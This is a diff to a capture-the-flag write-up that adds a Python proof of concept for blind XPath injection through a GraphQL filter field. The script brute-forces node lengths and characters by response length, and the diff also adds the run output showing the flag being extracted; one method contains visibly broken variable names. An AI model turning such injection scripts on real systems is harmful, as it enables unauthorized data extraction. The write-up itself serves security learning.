@@ -68,12 +68,12 @@ try {
 
 -----------------------
 
-- This target uses the graphl language but it is vulnerable to XPATH injection which is a vulnerability that affect websites that use `XPATH` to interact with `XML databases`.The exploitation aspect focuses on xpath injection in graphql.
+- This target uses the graphl language but it is vulnerable to XPATH injection which is a vulnerability that affect websites that use `XPATH` to interact with `XML databases`.The exploitation chain in summary is `graphql` to `xpath injection`.
 - I spotted the vulnerability with the error `Invalid Predicate` in the result.This StackOverflow [post](https://stackoverflow.com/questions/33830821/python-xpath-syntaxerror-invalid-predicate) associated the error to XPATH.
 
 ![image](https://github.com/user-attachments/assets/f9a7a19c-4d5a-491d-b990-bc265e2200b1)
 
-- I followed this [blogpost](https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/) to exploit the vulnerability but I modified the code slightly to exploit the target.
+- I followed the steps this [blogpost](https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/) to exploit the vulnerability but I modified the code slightly to exploit the target.
 - XPATH is like sql injection and the backend react differently to `TRUE` or `False` statements.In the case of a `TRUE` statement,we get the data related to id `1`.
 
 ![image](https://github.com/user-attachments/assets/f60082cd-397d-4787-9006-b73feb7112a5)
@@ -134,12 +134,157 @@ string-length(/data/products/product[1])=4
 ```xpath
 substring(/data/ctf_s3cr3ts/secret_value_8761[1], 1, position[int])
 ```
+- Poc-:
+
+```python3
+#! /usr/bin/env python3
+import requests
+from dataclasses import dataclass
+import string
+import json
+
+@dataclass
+class Exploit:
+      url: str
+      #Find string length
+      def stringlength(self,limit: int,node: str,position: int) -> str:
+          querydata = "{\n  festival(\n    filter: { \n      id: \"1\' and string-length(name({node}[{position}]))={length} and \'1\'=\'1\" \n    }\n  ) {\n    abbreviation\n    name\n    image\n    imagealt\n    description\n    year\n  }\n}\n\n"
+          headers = {"Content-Type": "application/json"}
+          for num in range(limit):
+              replaced_data = querydata.replace('{length}',str(num))
+              replaced_data = replaced_data.replace('{position}',str(position))
+              query = {"query":replaced_data.replace('{node}',node)}
+              text = requests.post(self.url,data=json.dumps(query),headers=headers).text
+              ###Checks based on the length of id 1 -> 779
+              if len(text) == 779:
+                 print(f"[+]Node {node}'s string length: {num} ")
+                 return num
+                 break
+      def childNodes(self,limit: int,node: str):
+          querydata = "{\n  festival(\n    filter: { \n      id: \"1\' and count({node}})={number} and \'1\'=\'1\" \n    }\n  ) {\n    abbreviation\n    name\n    image\n    imagealt\n    description\n    year\n  }\n}\n\n"
+          headers = {"Content-Type": "application/json"}
+          for num in range(limit):
+             replaced_data = querydata.replace('{number}',str(num))
+             query = {"query":messed_data.replace('{node}',node)}
+             text = requests.post(self.url,data=json.dumps(query),headers=headers).text
+             if len(text) == 779:
+                print(f"[+]Node {node} child nodes-: {i}")
+                return str(num)
+                break
+      def readChars(self,stringlength: int,node: str,position: int):
+           charset =  string.printable
+           found = ""
+           data = "{\n  festival(filter: {\n    id: \"1\' and substring(name({node}[{position}]), 1, offset)=\'{words}\' and \'1\'=\'1\"\n  }) {\n    abbreviation\n    name\n    image\n    imagealt\n    description\n    year\n  }\n}\n"
+           headers = {"Content-Type": "application/json"}
+           for i in range(stringlength + 1):
+               for char in charset:
+                   messed_query = data.replace("{words}",found+char)
+                   messed_query = messed_query.replace("offset",str(i))
+                   messed_query = messed_query.replace("{position}",str(position))
+                   query =  {"query":messed_query.replace("{node}",node)}
+                   text = requests.post(self.url,headers=headers,data=json.dumps(query)).text
+                   if len(text) == 779:
+                      found += char
+                      print(f"[+] Found char-: {found}")
+                      break
+           return found
+      def getTextNodeLength(self,limit: int,node: str,position: int) -> str:
+          querydata = "{\n  festival(\n    filter: { \n      id: \"1\' and string-length({node}[{position}])={length} and \'1\'=\'1\" \n    }\n  ) {\n    abbreviation\n    name\n    image\n    imagealt\n    description\n    year\n  }\n}\n\n"
+          headers = {"Content-Type": "application/json"}
+          for num in range(limit):
+              replaced_data = querydata.replace('{length}',str(num))
+              replaced_data = replaced_data.replace('{position}',str(position))
+              query = {"query":replaced_data.replace('{node}',node)}
+              text = requests.post(self.url,data=json.dumps(query),headers=headers).text
+              ###Checks based on the length of id 1 -> 779
+              if len(text) == 779:
+                 print(f"[+]Node {node}'s string length: {num} ")
+                 return num
+                 break
+           
+      def readTextNodeChars(self,textNodeLength: int,node:str,position: int):
+           found = ""
+           charset = string.printable
+           data = "{\n  festival(filter: {\n    id: \"1\' and substring({node}[{position}], 1, offset)=\'{words}\' and \'1\'=\'1\"\n  }) {\n    abbreviation\n    name\n    image\n    imagealt\n    description\n    year\n  }\n}\n"
+           headers = {"Content-Type": "application/json"}
+           for i in range(textNodeLength + 1):
+               for char in charset:
+                   messed_query = data.replace("{words}",found+char)
+                   messed_query = messed_query.replace("offset",str(i))
+                   messed_query = messed_query.replace("{position}",str(position))
+                   query =  {"query":messed_query.replace("{node}",node)}
+                   text = requests.post(self.url,headers=headers,data=json.dumps(query)).text
+                   if len(text) == 779:
+                      found += char
+                      print(f"[+] Found char-: {found}")
+                      break
+           return found
+
+def main():
+    exploit = Exploit("https://festivals.ctf.zone/graphql")
+    #finding root node
+    limit = 100
+    length = exploit.getTextNodeLength(100,"/data/ctf_s3cr3ts/secret_value_8761",1)
+    child_nodes = exploit.readTextNodeChars(length,"/data/ctf_s3cr3ts/secret_value_8761",1)
+if __name__ == "__main__":
+   main()
+```
+- Result-:
+
+```cmd
+▓   HP        Telegram Desktop  ❯  python festivalspoc.py
+[+]Node /data/ctf_s3cr3ts/secret_value_8761's string length: 38
+[+] Found char-: f
+[+] Found char-: fl
+[+] Found char-: fla
+[+] Found char-: flag
+[+] Found char-: flag{
+[+] Found char-: flag{f
+[+] Found char-: flag{f1
+[+] Found char-: flag{f16
+[+] Found char-: flag{f16c
+[+] Found char-: flag{f16ce
+[+] Found char-: flag{f16cee
+[+] Found char-: flag{f16ceec
+[+] Found char-: flag{f16ceec2
+[+] Found char-: flag{f16ceec23
+[+] Found char-: flag{f16ceec239
+[+] Found char-: flag{f16ceec239b
+[+] Found char-: flag{f16ceec239b5
+[+] Found char-: flag{f16ceec239b54
+[+] Found char-: flag{f16ceec239b54a
+[+] Found char-: flag{f16ceec239b54ae
+[+] Found char-: flag{f16ceec239b54aec
+[+] Found char-: flag{f16ceec239b54aec5
+[+] Found char-: flag{f16ceec239b54aec5e
+[+] Found char-: flag{f16ceec239b54aec5e7
+[+] Found char-: flag{f16ceec239b54aec5e74
+[+] Found char-: flag{f16ceec239b54aec5e74c
+[+] Found char-: flag{f16ceec239b54aec5e74c8
+[+] Found char-: flag{f16ceec239b54aec5e74c87
+[+] Found char-: flag{f16ceec239b54aec5e74c87c
+[+] Found char-: flag{f16ceec239b54aec5e74c87c4
+[+] Found char-: flag{f16ceec239b54aec5e74c87c4c
+[+] Found char-: flag{f16ceec239b54aec5e74c87c4c3
+[+] Found char-: flag{f16ceec239b54aec5e74c87c4c30
+[+] Found char-: flag{f16ceec239b54aec5e74c87c4c302
+[+] Found char-: flag{f16ceec239b54aec5e74c87c4c302a
+[+] Found char-: flag{f16ceec239b54aec5e74c87c4c302a1
+[+] Found char-: flag{f16ceec239b54aec5e74c87c4c302a12
+[+] Found char-: flag{f16ceec239b54aec5e74c87c4c302a12}
+```
 
 - Flag-: ` flag{f16ceec239b54aec5e74c87c4c302a12}`
 
 ![image](https://github.com/user-attachments/assets/524b7689-774c-4e76-a230-5d2071034727)
 
+------------------
 
+### REFERENCES-:
 
+------------------
 
+- [Invalid Predicate](https://stackoverflow.com/questions/33830821/python-xpath-syntaxerror-invalid-predicate)
+- [Vaadata](https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/)
 
+------------------
